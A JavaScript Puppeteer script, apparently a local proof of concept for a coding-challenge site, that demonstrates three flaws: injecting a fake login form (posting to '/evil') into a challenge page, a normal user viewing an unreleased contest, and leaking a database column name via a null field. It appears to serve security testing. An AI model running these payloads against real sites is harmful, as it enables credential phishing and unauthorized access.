import puppeteer from 'puppeteer';

const createUrl = (endpoint) => `http://127.0.0.1:2005${endpoint}`;

const login = async (page) => {
  await page.goto(createUrl('/auth/discord'));
  await page.waitForSelector('.em_container', { timeout: 0 });
  const cookies = await page.cookies();
  const cookie = cookies.find((c) => c.name === 'engineerman.sid');
  return `${cookie.name}=${cookie.value}`;
};

// Get superuser cookie
console.log('Log in with an account that has superuser permissions');
console.log(
  "If you don't have one, create an account and give it superuser permissions through `./emkc mysql`"
);
const superUserBrowser = await puppeteer.launch({
  headless: false,
  userDataDir: './test'
});
const superUserPage = await superUserBrowser.newPage();
const superUserCookie = await login(superUserPage);
console.log({ superUserCookie });

// Create future contest
{
  const startDate = new Date();
  startDate.setFullYear(startDate.getFullYear() + 1);
  const endDate = new Date(startDate);
  endDate.setFullYear(endDate.getFullYear() + 1);

  const body = JSON.stringify({
    name: `Future contest ${startDate}`,
    description: JSON.stringify({
      ops: [
        {
          insert: 'Future contest\n'
        }
      ]
    }),
    start_date: startDate,
    end_date: endDate,
    input: 'asd',
    output: 'asd',
    disallowed_languages: 'awk,basic.net,csharp.net,python2,python2,awk,dotnet,csharp.net,basic.net'
  });

  await fetch(createUrl('/admin/contests/create'), {
    credentials: 'include',
    headers: {
      Accept: 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Content-Type': 'application/json;charset=utf-8',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      Cookie: superUserCookie
    },
    body,
    method: 'POST',
    mode: 'cors'
  });
}

await superUserPage.goto(createUrl('/admin/contests'));

// Get future contest url
await superUserPage.waitForSelector('td.actions');
const futureContestEndpoint = await superUserPage.$eval(
  'td.actions:first-child a:nth-child(2)',
  (element) => element.getAttribute('href')
);
console.log({ futureContestUrl: futureContestEndpoint });

// Create an XSS injected challenge
{
  console.log('XSS Attack');

  const body = JSON.stringify({
    draft: 0,
    difficulty: 1,
    points: 10,
    name: 'XSS injected',
    description: 'XSS injected',
    html: `
        <form action="/evil" method="post">
        <label>Username</label>
        <input type="text">
        <label>Password</label>
        <input type="password">
        <input type="submit" value="Log in">
        </form>
        `,
    tests: [{ challenge_id: -1, name: '12', input: '12', output: '12', index: 0 }]
  });

  const res = await fetch(createUrl('/admin/challenges/create'), {
    credentials: 'include',
    headers: {
      Accept: 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'no-cors',
      'Sec-Fetch-Site': 'same-origin',
      'Content-Type': 'application/json;charset=utf-8',
      Pragma: 'no-cache',
      'Cache-Control': 'no-cache',
      Cookie: superUserCookie
    },
    body: body,
    method: 'POST',
    mode: 'cors'
  });

  console.log({ statusText: res.statusText });
  console.log(
    'If the attack is successful, you will see a new challenge called "XSS injected" with an unsafe form'
  );
}

await superUserPage.close();
await superUserBrowser.close();

// Get normal user cookie
const userBrowser = await puppeteer.launch({
  headless: false,
  userDataDir: './test2'
});
const userPage = await userBrowser.newPage();
console.log('Log in as a normal user');
const userCookie = await login(userPage);

// as normal user, access future contest
{
  console.log('Viewing a future contest as an unauthorized user attack');
  await userPage.goto(createUrl(futureContestEndpoint));
  await userPage.waitForSelector('.em_contests_contest');
  await userPage.screenshot({ path: './future-contest.jpg' });
  console.log(
    'If the attack is successful, there will be a screenshot called future-contest.jpg with the content of the future contest'
  );
}

// as a normal user, create a snippet with null language leading to exposing an internal column name
{
  const body = JSON.stringify({
    language: null,
    snip: 'a'
  });

  console.log('Exposing a database column name attack');
  const res = await fetch('http://127.0.0.1:2005/snippets', {
    credentials: 'include',
    headers: {
      'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0',
      Accept: 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.5',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'no-cors',
      'Sec-Fetch-Site': 'same-origin',
      'Content-Type': 'application/json;charset=utf-8',
      Pragma: 'no-cache',
      'Cache-Control': 'no-cache',
      Cookie: userCookie
    },
    referrer: 'http://127.0.0.1:2005/snippets',
    body,
    method: 'POST',
    mode: 'cors'
  });

  console.log(
    'If the attack is successful, the following message will reveal an internal database column:'
  );
  console.log(await res.text());
}

await userPage.close();
await userBrowser.close();
